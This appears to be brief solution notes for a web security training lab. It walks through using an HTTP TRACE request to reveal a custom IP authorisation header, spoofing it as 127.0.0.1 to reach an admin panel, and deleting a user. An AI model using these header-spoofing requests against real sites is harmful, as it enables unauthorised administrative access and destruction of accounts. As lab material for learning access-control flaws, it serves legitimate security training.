/*
Intercept the request GET /my-account?id=wiener
change it to
TRACE /my-account?id=wiener HTTP/2

response shows:
X-Custom-IP-Authorization: 223.233.74.230

send to repeater 
GET /admin HTTP/1.1
X-Custom-IP-Authorization: 223.233.74.230
Error: Admin interface only available to local users

send to repeater 
GET /admin HTTP/1.1
X-Custom-IP-Authorization: 127.0.0.1

send to repeater 
GET /admin/delete?username=carlos HTTP/1.1
X-Custom-IP-Authorization: 127.0.0.1

*/